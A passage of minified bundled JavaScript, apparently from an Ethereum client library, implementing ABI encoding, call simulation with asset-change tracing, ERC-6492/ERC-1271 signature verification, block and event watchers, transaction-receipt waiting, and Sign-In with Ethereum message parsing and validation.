invalid. Expected 4 bytes. Received ${r.size(y)} bytes ("${y}").`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiItem.InvalidSelectorSizeError"})}}return lo.InvalidSelectorSizeError=b,lo}var see;function R$e(){if(see)return sp;see=1,Object.defineProperty(sp,"__esModule",{value:!0}),sp.decode=i,sp.encode=s,sp.format=o,sp.from=a,sp.fromAbi=c;const t=n0(),e=Ade(),n=t5(),r=Os();function i(...l){const[f,h]=(()=>{if(Array.isArray(l[0])){const[w,y]=l;return[c(w),y]}return l})(),{bytecode:m}=h;if(f.inputs.length===0)return;const b=h.data.replace(m,"0x");return n.decode(f.inputs,b)}function s(...l){const[f,h]=(()=>{if(Array.isArray(l[0])){const[w,y]=l;return[c(w),y]}return l})(),{bytecode:m,args:b}=h;return r.concat(m,f.inputs?.length&&b?.length?n.encode(f.inputs,b):"0x")}function o(l){return t.formatAbiItem(l)}function a(l){return e.from(l)}function c(l){const f=l.find(h=>h.type==="constructor");if(!f)throw new e.NotFoundError({name:"constructor"});return f}return sp}var vu={},oee;function P$e(){if(oee)return vu;oee=1,Object.defineProperty(vu,"__esModule",{value:!0}),vu.decodeData=i,vu.decodeResult=s,vu.encodeData=o,vu.encodeResult=a,vu.format=c,vu.from=l,vu.fromAbi=f,vu.getSelector=h;const t=n0(),e=Ade(),n=t5(),r=Os();function i(...m){const[b,w]=(()=>{if(Array.isArray(m[0])){const[A,R,S]=m;return[f(A,R),S]}return m})(),{overloads:y}=b;if(r.size(w)<4)throw new e.InvalidSelectorSizeError({data:w});if(b.inputs.length===0)return;const E=y?f([b,...y],w):b;if(!(r.size(w)<=4))return n.decode(E.inputs,r.slice(w,4))}function s(...m){const[b,w,y={}]=(()=>{if(Array.isArray(m[0])){const[A,R,S,v]=m;return[f(A,R),S,v]}return m})(),E=n.decode(b.outputs,w,y);if(!(E&&Object.keys(E).length===0))return E&&Object.keys(E).length===1?Array.isArray(E)?E[0]:Object.values(E)[0]:E}function o(...m){const[b,w=[]]=(()=>{if(Array.isArray(m[0])){const[k,O,_]=m;return[f(k,O,{args:_}),_]}const[S,v]=m;return[S,v]})(),{overloads:y}=b,E=y?f([b,...y],b.name,{args:w}):b,A=h(E),R=w.length>0?n.encode(E.inputs,w):void 0;return R?r.concat(A,R):A}function a(...m){const[b,w,y={}]=(()=>{if(Array.isArray(m[0])){const[R,S,v,k]=m;return[f(R,S),v,k]}return m})(),{as:E="Array"}=y,A=b.outputs.length===1?[w]:Array.isArray(w)?w:E==="Object"?Object.values(w):[w];return n.encode(b.outputs,A)}function c(m){return t.formatAbiItem(m)}function l(m,b={}){return e.from(m,b)}function f(m,b,w){const y=e.fromAbi(m,b,w);if(y.type!=="function")throw new e.NotFoundError({name:b,type:"function"});return y}function h(m){return e.getSelector(m)}return vu}var La={},aee;function Cde(){return aee||(aee=1,Object.defineProperty(La,"__esModule",{value:!0}),La.zeroAddress=La.ethAddress=La.entryPoint08Address=La.entryPoint07Address=La.entryPoint06Address=void 0,La.entryPoint06Address="0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789",La.entryPoint07Address="0x0000000071727De22E5E9d8BAf0edAc6f37da032",La.entryPoint08Address="0x4337084D9E255Ff0702461CF8895CE9E3b5Ff108",La.ethAddress="0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",La.zeroAddress="0x0000000000000000000000000000000000000000"),La}var cee;function N$e(){if(cee)return t4;cee=1,Object.defineProperty(t4,"__esModule",{value:!0}),t4.simulateCalls=h;const t=R$e(),e=P$e(),n=Qr(),r=Cde(),i=WA(),s=Kt(),o=ma(),a=kM(),c=Ule(),l=_de(),f="0x6080604052348015600e575f80fd5b5061016d8061001c5f395ff3fe608060405234801561000f575f80fd5b5060043610610029575f3560e01c8063f8b2cb4f1461002d575b5f80fd5b610047600480360381019061004291906100db565b61005d565b604051610054919061011e565b60405180910390f35b5f8173ffffffffffffffffffffffffffffffffffffffff16319050919050565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100aa82610081565b9050919050565b6100ba816100a0565b81146100c4575f80fd5b50565b5f813590506100d5816100b1565b92915050565b5f602082840312156100f0576100ef61007d565b5b5f6100fd848285016100c7565b91505092915050565b5f819050919050565b61011881610106565b82525050565b5f6020820190506101315f83018461010f565b9291505056fea26469706673582212203b9fe929fe995c7cf9887f0bdba8a36dd78e8b73f149b17d2d9ad7cd09d2dc6264736f6c634300081a0033";async function h(m,b){const{blockNumber:w,blockTag:y,calls:E,stateOverrides:A,traceAssetChanges:R,traceTransfers:S,validation:v}=b,k=b.account?(0,n.parseAccount)(b.account):void 0;if(R&&!k)throw new s.BaseError("`account` is required when `traceAssetChanges` is true");const O=k?t.encode(t.from("constructor(bytes, bytes)"),{bytecode:i.deploylessCallViaBytecodeBytecode,args:[f,e.encodeData(e.from("function getBalance(address)"),[k.address])]}):void 0,_=R?await Promise.all(b.calls.map(async ue=>{if(!ue.data&&!ue.abi)return;const{accessList:be}=await(0,c.createAccessList)(m,{account:k.address,...ue,data:ue.abi?(0,o.encodeFunctionData)(ue):ue.data});return be.map(({address:Me,storageKeys:Te})=>Te.length>0?Me:null)})).then(ue=>ue.flat().filter(Boolean)):[],I=await(0,l.simulateBlocks)(m,{blockNumber:w,blockTag:y,blocks:[...R?[{calls:[{data:O}],stateOverrides:A},{calls:_.map((ue,be)=>({abi:[e.from("function balanceOf(address) returns (uint256)")],functionName:"balanceOf",args:[k.address],to:ue,from:r.zeroAddress,nonce:be})),stateOverrides:[{address:r.zeroAddress,nonce:0}]}]:[],{calls:[...E,{}].map(ue=>({...ue,from:k?.address})),stateOverrides:A},...R?[{calls:[{data:O}]},{calls:_.map((ue,be)=>({abi:[e.from("function balanceOf(address) returns (uint256)")],functionName:"balanceOf",args:[k.address],to:ue,from:r.zeroAddress,nonce:be})),stateOverrides:[{address:r.zeroAddress,nonce:0}]},{calls:_.map((ue,be)=>({to:ue,abi:[e.from("function decimals() returns (uint256)")],functionName:"decimals",from:r.zeroAddress,nonce:be})),stateOverrides:[{address:r.zeroAddress,nonce:0}]},{calls:_.map((ue,be)=>({to:ue,abi:[e.from("function tokenURI(uint256) returns (string)")],functionName:"tokenURI",args:[0n],from:r.zeroAddress,nonce:be})),stateOverrides:[{address:r.zeroAddress,nonce:0}]},{calls:_.map((ue,be)=>({to:ue,abi:[e.from("function symbol() returns (string)")],functionName:"symbol",from:r.zeroAddress,nonce:be})),stateOverrides:[{address:r.zeroAddress,nonce:0}]}]:[]],traceTransfers:S,validation:v}),T=R?I[2]:I[0],[B,U,,M,N,q,P,C]=R?I:[],{calls:j,...z}=T,$=j.slice(0,-1)??[],H=B?.calls??[],L=U?.calls??[],V=[...H,...L].map(ue=>ue.status==="success"?(0,a.hexToBigInt)(ue.data):null),G=M?.calls??[],Z=N?.calls??[],J=[...G,...Z].map(ue=>ue.status==="success"?(0,a.hexToBigInt)(ue.data):null),ne=(q?.calls??[]).map(ue=>ue.status==="success"?ue.result:null),re=(C?.calls??[]).map(ue=>ue.status==="success"?ue.result:null),le=(P?.calls??[]).map(ue=>ue.status==="success"?ue.result:null),oe=[];for(const[ue,be]of J.entries()){const Me=V[ue];if(typeof be!="bigint"||typeof Me!="bigint")continue;const Te=ne[ue-1],Oe=re[ue-1],Ke=le[ue-1],it=ue===0?{address:r.ethAddress,decimals:18,symbol:"ETH"}:{address:_[ue-1],decimals:Ke||Te?Number(Te??1):void 0,symbol:Oe??void 0};oe.some(at=>at.token.address===it.address)||oe.push({token:it,value:{pre:Me,post:be,diff:be-Me}})}return{assetChanges:oe,block:z,results:$}}return t4}var Nb={},F2={},mk={},uee;function O$e(){return uee||(uee=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.InvalidWrappedSignatureError=t.universalSignatureValidatorAbi=t.universalSignatureValidatorBytecode=t.magicBytes=void 0,t.assert=i,t.from=s,t.unwrap=o,t.wrap=a,t.validate=c;const e=t5(),n=rc(),r=Os();t.magicBytes="0x6492649264926492649264926492649264926492649264926492649264926492",t.universalSignatureValidatorBytecode="0x608060405234801561001057600080fd5b5060405161069438038061069483398101604081905261002f9161051e565b600061003c848484610048565b9050806000526001601ff35b60007f64926492649264926492649264926492649264926492649264926492649264926100748361040c565b036101e7576000606080848060200190518101906100929190610577565b60405192955090935091506000906001600160a01b038516906100b69085906105dd565b6000604051808303816000865af19150503d80600081146100f3576040519150601f19603f3d011682016040523d82523d6000602084013e6100f8565b606091505b50509050876001600160a01b03163b60000361016057806101605760405162461bcd60e51b815260206004820152601e60248201527f5369676e617475726556616c696461746f723a206465706c6f796d656e74000060448201526064015b60405180910390fd5b604051630b135d3f60e11b808252906001600160a01b038a1690631626ba7e90610190908b9087906004016105f9565b602060405180830381865afa1580156101ad573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101d19190610633565b6001600160e01b03191614945050505050610405565b6001600160a01b0384163b1561027a57604051630b135d3f60e11b808252906001600160a01b03861690631626ba7e9061022790879087906004016105f9565b602060405180830381865afa158015610244573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102689190610633565b6001600160e01b031916149050610405565b81516041146102df5760405162461bcd60e51b815260206004820152603a602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e6174757265206c656e6774680000000000006064820152608401610157565b6102e7610425565b5060208201516040808401518451859392600091859190811061030c5761030c61065d565b016020015160f81c9050601b811480159061032b57508060ff16601c14155b1561038c5760405162461bcd60e51b815260206004820152603b602482015260008051602061067483398151915260448201527f3a20696e76616c6964207369676e617475726520762076616c756500000000006064820152608401610157565b60408051600081526020810180835289905260ff83169181019190915260608101849052608081018390526001600160a01b0389169060019060a0016020604051602081039080840390855afa1580156103ea573d6000803e3d6000fd5b505050602060405103516001600160a01b0316149450505050505b9392505050565b600060208251101561041d57600080fd5b508051015190565b60405180606001604052806003906020820280368337509192915050565b6001600160a01b038116811461045857600080fd5b50565b634e487b7160e01b600052604160045260246000fd5b60005b8381101561048c578181015183820152602001610474565b50506000910152565b600082601f8301126104a657600080fd5b81516001600160401b038111156104bf576104bf61045b565b604051601f8201601f19908116603f011681016001600160401b03811182821017156104ed576104ed61045b565b60405281815283820160200185101561050557600080fd5b610516826020830160208701610471565b949350505050565b60008060006060848603121561053357600080fd5b835161053e81610443565b6020850151604086015191945092506001600160401b0381111561056157600080fd5b61056d86828701610495565b9150509250925092565b60008060006060848603121561058c57600080fd5b835161059781610443565b60208501519093506001600160401b038111156105b357600080fd5b6105bf86828701610495565b604086015190935090506001600160401b0381111561056157600080fd5b600082516105ef818460208701610471565b9190910192915050565b828152604060208201526000825180604084015261061e816060850160208701610471565b601f01601f1916919091016060019392505050565b60006020828403121561064557600080fd5b81516001600160e01b03198116811461040557600080fd5b634e487b7160e01b600052603260045260246000fdfe5369676e617475726556616c696461746f72237265636f7665725369676e6572",t.universalSignatureValidatorAbi=[{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],stateMutability:"nonpayable",type:"constructor"},{inputs:[{name:"_signer",type:"address"},{name:"_hash",type:"bytes32"},{name:"_signature",type:"bytes"}],outputs:[{type:"bool"}],stateMutability:"nonpayable",type:"function",name:"isValidSig"}];function i(f){if(r.slice(f,-32)!==t.magicBytes)throw new l(f)}function s(f){return typeof f=="string"?o(f):f}function o(f){i(f);const[h,m,b]=e.decode(e.from("address, bytes, bytes"),f);return{data:m,signature:b,to:h}}function a(f){const{data:h,signature:m,to:b}=f;return r.concat(e.encode(e.from("address, bytes, bytes"),[b,h,m]),t.magicBytes)}function c(f){try{return i(f),!0}catch{return!1}}class l extends n.BaseError{constructor(h){super(`Value \`${h}\` is an invalid ERC-6492 wrapped signature.`),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SignatureErc6492.InvalidWrappedSignatureError"})}}t.InvalidWrappedSignatureError=l})(mk)),mk}var lee;function k$e(){return lee||(lee=1,Object.defineProperty(F2,"__esModule",{value:!0}),F2.SignatureErc6492=void 0,F2.SignatureErc6492=O$e()),F2}var n4={},dee;function Sde(){if(dee)return n4;dee=1,Object.defineProperty(n4,"__esModule",{value:!0}),n4.serializeSignature=r;const t=uy(),e=ci(),n=yr();function r({r:i,s,to:o="hex",v:a,yParity:c}){const l=(()=>{if(c===0||c===1)return c;if(a&&(a===27n||a===28n||a>=35n))return a%2n===0n?1:0;throw new Error("Invalid `v` or `yParity` value")})(),f=`0x${new t.secp256k1.Signature((0,e.hexToBigInt)(i),(0,e.hexToBigInt)(s)).toCompactHex()}${l===0?"1b":"1c"}`;return o==="hex"?f:(0,n.hexToBytes)(f)}return n4}var fee;function uR(){if(fee)return Nb;fee=1,Object.defineProperty(Nb,"__esModule",{value:!0}),Nb.verifyHash=v,Nb.verifyErc8010=k,Nb.verifyErc1271=_;const t=k$e(),e=aR(),n=f0(),r=WA(),i=o0(),s=KA(),o=ma(),a=nc(),c=Ju(),l=Vle(),f=os(),h=So(),m=ci(),b=lt(),w=Pn(),y=u0(),E=Sde(),A=ZA(),R=$le(),S=ld();async function v(T,B){const{address:U,hash:M,erc6492VerifierAddress:N=B.universalSignatureVerifierAddress??T.chain?.contracts?.erc6492Verifier?.address,multicallAddress:q=B.multicallAddress??T.chain?.contracts?.multicall3?.address}=B,P=(()=>{const C=B.signature;return(0,h.isHex)(C)?C:typeof C=="object"&&"r"in C&&"s"in C?(0,E.serializeSignature)(C):(0,b.bytesToHex)(C)})();try{return e.SignatureErc8010.validate(P)?await k(T,{...B,multicallAddress:q,signature:P}):await O(T,{...B,verifierAddress:N,signature:P})}catch(C){try{if((0,c.isAddressEqual)((0,a.getAddress)(U),await(0,y.recoverAddress)({hash:M,signature:P})))return!0}catch{}if(C instanceof I)return!1;throw C}}async function k(T,B){const{address:U,blockNumber:M,blockTag:N,hash:q,multicallAddress:P}=B,{authorization:C,data:j,signature:z,to:$}=e.SignatureErc8010.unwrap(B.signature);if(await(0,R.getCode)(T,{address:U,blockNumber:M,blockTag:N})===(0,f.concatHex)(["0xef0100",C.address]))return await _(T,{address:U,blockNumber:M,blockTag:N,hash:q,signature:z});const L={address:C.address,chainId:Number(C.chainId),nonce:Number(C.nonce),r:(0,b.numberToHex)(C.r,{size:32}),s:(0,b.numberToHex)(C.s,{size:32}),yParity:C.yParity};if(!await(0,l.verifyAuthorization)({address:U,authorization:L}))throw new I;const G=await(0,w.getAction)(T,S.readContract,"readContract")({...P?{address:P}:{code:r.multicall3Bytecode},authorizationList:[L],abi:n.multicall3Abi,blockNumber:M,blockTag:"pending",functionName:"aggregate3",args:[[...j?[{allowFailure:!0,target:$??U,callData:j}]:[],{allowFailure:!0,target:U,callData:(0,o.encodeFunctionData)({abi:n.erc1271Abi,functionName:"isValidSignature",args:[q,z]})}]]});if(G[G.length-1]?.returnData?.startsWith("0x1626ba7e"))return!0;throw new I}async function O(T,B){const{address:U,factory:M,factoryData:N,hash:q,signature:P,verifierAddress:C,...j}=B,z=await(async()=>!M&&!N||t.SignatureErc6492.validate(P)?P:t.SignatureErc6492.wrap({data:N,signature:P,to:M}))(),$=C?{to:C,data:(0,o.encodeFunctionData)({abi:n.erc6492SignatureValidatorAbi,functionName:"isValidSig",args:[U,q,z]}),...j}:{data:(0,s.encodeDeployData)({abi:n.erc6492SignatureValidatorAbi,args:[U,q,z],bytecode:r.erc6492SignatureValidatorByteCode}),...j},{data:H}=await(0,w.getAction)(T,A.call,"call")($).catch(L=>{throw L instanceof i.CallExecutionError?new I:L});if((0,m.hexToBool)(H??"0x0"))return!0;throw new I}async function _(T,B){const{address:U,blockNumber:M,blockTag:N,hash:q,signature:P}=B;if((await(0,w.getAction)(T,S.readContract,"readContract")({address:U,abi:n.erc1271Abi,args:[q,P],blockNumber:M,blockTag:N,functionName:"isValidSignature"}).catch(j=>{throw j instanceof i.ContractFunctionExecutionError?new I:j})).startsWith("0x1626ba7e"))return!0;throw new I}class I extends Error{}return Nb}var r4={},hee;function D$e(){if(hee)return r4;hee=1,Object.defineProperty(r4,"__esModule",{value:!0}),r4.verifyMessage=r;const t=Pn(),e=XA(),n=uR();async function r(i,{address:s,message:o,factory:a,factoryData:c,signature:l,...f}){const h=(0,e.hashMessage)(o);return(0,t.getAction)(i,n.verifyHash,"verifyHash")({address:s,factory:a,factoryData:c,hash:h,signature:l,...f})}return r4}var i4={},pee;function B$e(){if(pee)return i4;pee=1,Object.defineProperty(i4,"__esModule",{value:!0}),i4.verifyTypedData=r;const t=Pn(),e=e5(),n=uR();async function r(i,s){const{address:o,factory:a,factoryData:c,signature:l,message:f,primaryType:h,types:m,domain:b,...w}=s,y=(0,e.hashTypedData)({message:f,primaryType:h,types:m,domain:b});return(0,t.getAction)(i,n.verifyHash,"verifyHash")({address:o,factory:a,factoryData:c,hash:y,signature:l,...w})}return i4}var s4={},o4={},mee;function Tde(){if(mee)return o4;mee=1,Object.defineProperty(o4,"__esModule",{value:!0}),o4.watchBlockNumber=o;const t=ci(),e=Pn(),n=dy(),r=vw(),i=Ns(),s=YA();function o(a,{emitOnBegin:c=!1,emitMissed:l=!1,onBlockNumber:f,onError:h,poll:m,pollingInterval:b=a.pollingInterval}){const w=typeof m<"u"?m:!(a.transport.type==="webSocket"||a.transport.type==="ipc"||a.transport.type==="fallback"&&(a.transport.transports[0].config.type==="webSocket"||a.transport.transports[0].config.type==="ipc"));let y;return w?(()=>{const R=(0,i.stringify)(["watchBlockNumber",a.uid,c,l,b]);return(0,n.observe)(R,{onBlockNumber:f,onError:h},S=>(0,r.poll)(async()=>{try{const v=await(0,e.getAction)(a,s.getBlockNumber,"getBlockNumber")({cacheTime:0});if(y!==void 0){if(v===y)return;if(v-y>1&&l)for(let k=y+1n;k<v;k++)S.onBlockNumber(k,y),y=k}(y===void 0||v>y)&&(S.onBlockNumber(v,y),y=v)}catch(v){S.onError?.(v)}},{emitOnBegin:c,interval:b}))})():(()=>{const R=(0,i.stringify)(["watchBlockNumber",a.uid,c,l]);return(0,n.observe)(R,{onBlockNumber:f,onError:h},S=>{let v=!0,k=()=>v=!1;return(async()=>{try{const O=(()=>{if(a.transport.type==="fallback"){const I=a.transport.transports.find(T=>T.config.type==="webSocket"||T.config.type==="ipc");return I?I.value:a.transport}return a.transport})(),{unsubscribe:_}=await O.subscribe({params:["newHeads"],onData(I){if(!v)return;const T=(0,t.hexToBigInt)(I.result?.number);S.onBlockNumber(T,y),y=T},onError(I){S.onError?.(I)}});k=_,v||k()}catch(O){h?.(O)}})(),()=>k()})})()}return o4}var gee;function xde(){if(gee)return s4;gee=1,Object.defineProperty(s4,"__esModule",{value:!0}),s4.waitForTransactionReceipt=h;const t=Wj(),e=ga(),n=Pn(),r=dy(),i=nM(),s=tR(),o=Ns(),a=ly(),c=DM(),l=Ede(),f=Tde();async function h(m,b){const{checkReplacement:w=!0,confirmations:y=1,hash:E,onReplaced:A,retryCount:R=6,retryDelay:S=({count:j})=>~~(1<<j)*200,timeout:v=18e4}=b,k=(0,o.stringify)(["waitForTransactionReceipt",m.uid,E]),O=b.pollingInterval?b.pollingInterval:m.chain?.experimental_preconfirmationTime?m.chain.experimental_preconfirmationTime:m.pollingInterval;let _,I,T,B=!1,U,M;const{promise:N,resolve:q,reject:P}=(0,i.withResolvers)(),C=v?setTimeout(()=>{M?.(),U?.(),P(new e.WaitForTransactionReceiptTimeoutError({hash:E}))},v):void 0;return U=(0,r.observe)(k,{onReplaced:A,resolve:q,reject:P},async j=>{if(T=await(0,n.getAction)(m,l.getTransactionReceipt,"getTransactionReceipt")({hash:E}).catch(()=>{}),T&&y<=1){clearTimeout(C),j.resolve(T),U?.();return}M=(0,n.getAction)(m,f.watchBlockNumber,"watchBlockNumber")({emitMissed:!0,emitOnBegin:!0,poll:!0,pollingInterval:O,async onBlockNumber(z){const $=L=>{clearTimeout(C),M?.(),L(),U?.()};let H=z;if(!B)try{if(T){if(y>1&&(!T.blockNumber||H-T.blockNumber+1n<y))return;$(()=>j.resolve(T));return}if(w&&!_&&(B=!0,await(0,s.withRetry)(async()=>{_=await(0,n.getAction)(m,c.getTransaction,"getTransaction")({hash:E}),_.blockNumber&&(H=_.blockNumber)},{delay:S,retryCount:R}),B=!1),T=await(0,n.getAction)(m,l.getTransactionReceipt,"getTransactionReceipt")({hash:E}),y>1&&(!T.blockNumber||H-T.blockNumber+1n<y))return;$(()=>j.resolve(T))}catch(L){if(L instanceof e.TransactionNotFoundError||L instanceof e.TransactionReceiptNotFoundError){if(!_){B=!1;return}try{I=_,B=!0;const V=await(0,s.withRetry)(()=>(0,n.getAction)(m,a.getBlock,"getBlock")({blockNumber:H,includeTransactions:!0}),{delay:S,retryCount:R,shouldRetry:({error:J})=>J instanceof t.BlockNotFoundError});B=!1;const G=V.transactions.find(({from:J,nonce:ne})=>J===I.from&&ne===I.nonce);if(!G||(T=await(0,n.getAction)(m,l.getTransactionReceipt,"getTransactionReceipt")({hash:G.hash}),y>1&&(!T.blockNumber||H-T.blockNumber+1n<y)))return;let Z="replaced";G.to===I.to&&G.value===I.value&&G.input===I.input?Z="repriced":G.from===G.to&&G.value===0n&&(Z="cancelled"),$(()=>{j.onReplaced?.({reason:Z,replacedTransaction:I,transaction:G,transactionReceipt:T}),j.resolve(T)})}catch(V){$(()=>j.reject(V))}}else $(()=>j.reject(L))}}})}),N}return s4}var a4={},yee;function j$e(){if(yee)return a4;yee=1,Object.defineProperty(a4,"__esModule",{value:!0}),a4.watchBlocks=s;const t=Pn(),e=dy(),n=vw(),r=Ns(),i=ly();function s(o,{blockTag:a=o.experimental_blockTag??"latest",emitMissed:c=!1,emitOnBegin:l=!1,onBlock:f,onError:h,includeTransactions:m,poll:b,pollingInterval:w=o.pollingInterval}){const y=typeof b<"u"?b:!(o.transport.type==="webSocket"||o.transport.type==="ipc"||o.transport.type==="fallback"&&(o.transport.transports[0].config.type==="webSocket"||o.transport.transports[0].config.type==="ipc")),E=m??!1;let A;return y?(()=>{const v=(0,r.stringify)(["watchBlocks",o.uid,a,c,l,E,w]);return(0,e.observe)(v,{onBlock:f,onError:h},k=>(0,n.poll)(async()=>{try{const O=await(0,t.getAction)(o,i.getBlock,"getBlock")({blockTag:a,includeTransactions:E});if(O.number!==null&&A?.number!=null){if(O.number===A.number)return;if(O.number-A.number>1&&c)for(let _=A?.number+1n;_<O.number;_++){const I=await(0,t.getAction)(o,i.getBlock,"getBlock")({blockNumber:_,includeTransactions:E});k.onBlock(I,A),A=I}}(A?.number==null||a==="pending"&&O?.number==null||O.number!==null&&O.number>A.number)&&(k.onBlock(O,A),A=O)}catch(O){k.onError?.(O)}},{emitOnBegin:l,interval:w}))})():(()=>{let v=!0,k=!0,O=()=>v=!1;return(async()=>{try{l&&(0,t.getAction)(o,i.getBlock,"getBlock")({blockTag:a,includeTransactions:E}).then(T=>{v&&k&&(f(T,void 0),k=!1)}).catch(h);const _=(()=>{if(o.transport.type==="fallback"){const T=o.transport.transports.find(B=>B.config.type==="webSocket"||B.config.type==="ipc");return T?T.value:o.transport}return o.transport})(),{unsubscribe:I}=await _.subscribe({params:["newHeads"],async onData(T){if(!v)return;const B=await(0,t.getAction)(o,i.getBlock,"getBlock")({blockNumber:T.result?.number,includeTransactions:E}).catch(()=>{});v&&(f(B,A),k=!1,A=B)},onError(T){h?.(T)}});O=I,v||O()}catch(_){h?.(_)}})(),()=>O()})()}return a4}var c4={},bee;function M$e(){if(bee)return c4;bee=1,Object.defineProperty(c4,"__esModule",{value:!0}),c4.watchEvent=w;const t=$r(),e=a0(),n=qA(),r=oy(),i=Xf(),s=Pn(),o=dy(),a=vw(),c=Ns(),l=Lle(),f=YA(),h=J8(),m=Xj(),b=X8();function w(y,{address:E,args:A,batch:R=!0,event:S,events:v,fromBlock:k,onError:O,onLogs:_,poll:I,pollingInterval:T=y.pollingInterval,strict:B}){const U=typeof I<"u"?I:typeof k=="bigint"?!0:!(y.transport.type==="webSocket"||y.transport.type==="ipc"||y.transport.type==="fallback"&&(y.transport.transports[0].config.type==="webSocket"||y.transport.transports[0].config.type==="ipc")),M=B??!1;return U?(()=>{const P=(0,c.stringify)(["watchEvent",E,A,R,y.uid,S,T,k]);return(0,o.observe)(P,{onLogs:_,onError:O},C=>{let j;k!==void 0&&(j=k-1n);let z,$=!1;const H=(0,a.poll)(async()=>{if(!$){try{z=await(0,s.getAction)(y,l.createEventFilter,"createEventFilter")({address:E,args:A,event:S,events:v,strict:M,fromBlock:k})}catch{}$=!0;return}try{let L;if(z)L=await(0,s.getAction)(y,h.getFilterChanges,"getFilterChanges")({filter:z});else{const V=await(0,s.getAction)(y,f.getBlockNumber,"getBlockNumber")({});j&&j!==V?L=await(0,s.getAction)(y,m.getLogs,"getLogs")({address:E,args:A,event:S,events:v,fromBlock:j+1n,toBlock:V}):L=[],j=V}if(L.length===0)return;if(R)C.onLogs(L);else for(const V of L)C.onLogs([V])}catch(L){z&&L instanceof e.InvalidInputRpcError&&($=!1),C.onError?.(L)}},{emitOnBegin:!0,interval:T});return async()=>{z&&await(0,s.getAction)(y,b.uninstallFilter,"uninstallFilter")({filter:z}),H()}})})():(()=>{let P=!0,C=()=>P=!1;return(async()=>{try{const j=(()=>{if(y.transport.type==="fallback"){const L=y.transport.transports.find(V=>V.config.type==="webSocket"||V.config.type==="ipc");return L?L.value:y.transport}return y.transport})(),z=v??(S?[S]:void 0);let $=[];z&&($=[z.flatMap(V=>(0,r.encodeEventTopics)({abi:[V],eventName:V.name,args:A}))],S&&($=$[0]));const{unsubscribe:H}=await j.subscribe({params:["logs",{address:E,topics:$}],onData(L){if(!P)return;const V=L.result;try{const{eventName:G,args:Z}=(0,n.decodeEventLog)({abi:z??[],data:V.data,topics:V.topics,strict:M}),J=(0,i.formatLog)(V,{args:Z,eventName:G});_([J])}catch(G){let Z,J;if(G instanceof t.DecodeLogDataMismatch||G instanceof t.DecodeLogTopicsMismatch){if(B)return;Z=G.abiItem.name,J=G.abiItem.inputs?.some(re=>!("name"in re&&re.name))}const ne=(0,i.formatLog)(V,{args:J?[]:{},eventName:Z});_([ne])}},onError(L){O?.(L)}});C=H,P||C()}catch(j){O?.(j)}})(),()=>C()})()}return c4}var u4={},wee;function U$e(){if(wee)return u4;wee=1,Object.defineProperty(u4,"__esModule",{value:!0}),u4.watchPendingTransactions=a;const t=Pn(),e=dy(),n=vw(),r=Ns(),i=Fle(),s=J8(),o=X8();function a(c,{batch:l=!0,onError:f,onTransactions:h,poll:m,pollingInterval:b=c.pollingInterval}){return(typeof m<"u"?m:c.transport.type!=="webSocket"&&c.transport.type!=="ipc")?(()=>{const A=(0,r.stringify)(["watchPendingTransactions",c.uid,l,b]);return(0,e.observe)(A,{onTransactions:h,onError:f},R=>{let S;const v=(0,n.poll)(async()=>{try{if(!S)try{S=await(0,t.getAction)(c,i.createPendingTransactionFilter,"createPendingTransactionFilter")({});return}catch(O){throw v(),O}const k=await(0,t.getAction)(c,s.getFilterChanges,"getFilterChanges")({filter:S});if(k.length===0)return;if(l)R.onTransactions(k);else for(const O of k)R.onTransactions([O])}catch(k){R.onError?.(k)}},{emitOnBegin:!0,interval:b});return async()=>{S&&await(0,t.getAction)(c,o.uninstallFilter,"uninstallFilter")({filter:S}),v()}})})():(()=>{let A=!0,R=()=>A=!1;return(async()=>{try{const{unsubscribe:S}=await c.transport.subscribe({params:["newPendingTransactions"],onData(v){if(!A)return;const k=v.result;h([k])},onError(v){f?.(v)}});R=S,A||R()}catch(S){f?.(S)}})(),()=>R()})()}return u4}var l4={},d4={},vee;function L$e(){if(vee)return d4;vee=1,Object.defineProperty(d4,"__esModule",{value:!0}),d4.parseSiweMessage=t;function t(r){const{scheme:i,statement:s,...o}=r.match(e)?.groups??{},{chainId:a,expirationTime:c,issuedAt:l,notBefore:f,requestId:h,...m}=r.match(n)?.groups??{},b=r.split("Resources:")[1]?.split(`
- `).slice(1);return{...o,...m,...a?{chainId:Number(a)}:{},...c?{expirationTime:new Date(c)}:{},...l?{issuedAt:new Date(l)}:{},...f?{notBefore:new Date(f)}:{},...h?{requestId:h}:{},...b?{resources:b}:{},...i?{scheme:i}:{},...s?{statement:s}:{}}}const e=/^(?:(?<scheme>[a-zA-Z][a-zA-Z0-9+-.]*):\/\/)?(?<domain>[a-zA-Z0-9+-.]*(?::[0-9]{1,5})?) (?:wants you to sign in with your Ethereum account:\n)(?<address>0x[a-fA-F0-9]{40})\n\n(?:(?<statement>.*)\n\n)?/,n=/(?:URI: (?<uri>.+))\n(?:Version: (?<version>.+))\n(?:Chain ID: (?<chainId>\d+))\n(?:Nonce: (?<nonce>[a-zA-Z0-9]+))\n(?:Issued At: (?<issuedAt>.+))(?:\nExpiration Time: (?<expirationTime>.+))?(?:\nNot Before: (?<notBefore>.+))?(?:\nRequest ID: (?<requestId>.+))?/;return d4}var f4={},Eee;function F$e(){if(Eee)return f4;Eee=1,Object.defineProperty(f4,"__esModule",{value:!0}),f4.validateSiweMessage=n;const t=pa(),e=Ju();function n(r){const{address:i,domain:s,message:o,nonce:a,scheme:c,time:l=new Date}=r;if(s&&o.domain!==s||a&&o.nonce!==a||c&&o.scheme!==c||o.expirationTime&&l>=o.expirationTime||o.notBefore&&l<o.notBefore)return!1;try{if(!o.address||!(0,t.isAddress)(o.address,{strict:!1})||i&&!(0,e.isAddressEqual)(o.address,i))return!1}catch{return!1}return!0}return f4}var _ee;function $$e(){if(_ee)return l4;_ee=1,Object.defineProperty(l4,"__esModule",{value:!0}),l4.verifySiweMessage=i;const t=XA(),e=L$e(),n=F$e(),r=uR();async function i(s,o){const{address:a,domain:c,message:l,nonce:f,scheme:h,signature:m,time:b=new 